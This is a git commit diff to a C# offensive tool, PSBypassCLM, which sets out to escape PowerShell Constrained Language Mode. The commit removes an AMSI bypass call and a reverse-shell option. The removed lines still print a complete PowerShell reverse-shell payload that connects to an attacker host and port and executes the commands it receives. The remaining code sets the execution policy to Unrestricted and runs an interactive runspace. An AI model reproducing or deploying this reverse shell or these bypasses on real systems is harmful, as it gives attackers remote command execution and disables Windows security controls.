8d8c9add7d1ca9fa002456208ac85c5a03615327
duemaster <zhangbsn@gmail.com>
2023-12-21 22:31:06 +0800

    Removed ASMI and Remote Option

--- PSBypassCLM/PSBypassCLM/Program.cs
+++ PSBypassCLM/PSBypassCLM/Program.cs
@@ -11,77 +11,20 @@ namespace PsBypassCostraintLanguageMode
     {
         public static void Main(string[] args)
         {
-            string command = "", rhost = "", port = "";
-            // checking for RevShell mode
-            bool revShell = false;
-            if (args != null && args.Length > 0 && !string.IsNullOrEmpty(args[0]) && !string.IsNullOrEmpty(args[1]))
-            {
-                revShell = true;
-                rhost = args[0];
-                port = args[1];
-            }
-
-
+            string command = "";
             Runspace runspace = RunspaceFactory.CreateRunspace();
             runspace.Open();
-
-            // OLD ** Amsi bypass technique from: http://cn33liz.blogspot.co.uk/2016/05/bypassing-amsi-using-powershell-5-dll.html
-            // OLD ** string Arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
-            // OLD ** AmsiBypass.Amsi(Arch);
-            // NEW ** https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/master/ASBBypass/Program.cs
-            AmsiBypass.Disable();
 
             // set execution policy to Unrestricted for current process
             // this should bypass costraint language mode from the low priv 'ConstrainedLanguage' to our beloved 'FullLanguage'
             RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
             runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");
 
-			//rev shell one-liner
-			//string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
-
-			//rev shell better one-liner (pretty printed) with exception handling
-			string revShellcommand = @"$client = New-Object System.Net.Sockets.TCPClient('{RHOST}',{PORT});
-                                    $stream = $client.GetStream();
-                                    [byte[]]$bytes = 0..65535|%{0};
-                                    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
-                                    {
-	                                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-	                                    try
-	                                    {	
-		                                    $sendback = (iex $data 2>&1 | Out-String );
-		                                    $sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';
-	                                    }
-	                                    catch
-	                                    {
-		                                    $error[0].ToString() + $error[0].InvocationInfo.PositionMessage;
-		                                    $sendback2  =  ""ERROR: "" + $error[0].ToString() + ""`n`n"" + ""PS "" + (pwd).Path + '> ';
-	                                    }	
-	                                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-	                                    $stream.Write($sendbyte,0,$sendbyte.Length);
-	                                    $stream.Flush();
-                                    };
-                                    $client.Close();" ;
-
-            // funny intro
-            if (!revShell)
-                Console.WriteLine("Type your P0w3rSh3ll command down here \n");
-            else
-            {
-                revShellcommand = revShellcommand.Replace("{RHOST}", rhost).Replace("{PORT}", port);
-            }
-
-            // loop for getting commands from Stdin
             do
             {
-                if (!revShell)
-                {
-                    Console.Write("PS > ");
-                    command = Console.ReadLine();
-                }
-                else
-                {
-                    command = revShellcommand;
-                }
+                Console.Write("PS > ");
+                command = Console.ReadLine();
+
 
                 // vervbse check!
                 if (!string.IsNullOrEmpty(command))
@@ -94,10 +37,7 @@ namespace PsBypassCostraintLanguageMode
                             pipeline.Commands.AddScript(command);
                             pipeline.Commands.Add("Out-String");
                             // if revshell true - run asyn one-liner script and exit
-                            if (revShell)
-                            {
-                                Console.Write("Trying to connect back...\n");
-                            }
+
                             // otherwise stay open and ready to accept and invoke commands
                             Collection<PSObject> results = pipeline.Invoke();
 							//var process = (Process)pipeline.Output.Read().BaseObject;
@@ -111,8 +51,6 @@ namespace PsBypassCostraintLanguageMode
                         }
                         catch (Exception ex)
                         {
-                            if (revShell)
-                                revShellcommand = "";
                             Console.WriteLine("{0}", ex.Message);
                         }
                     }
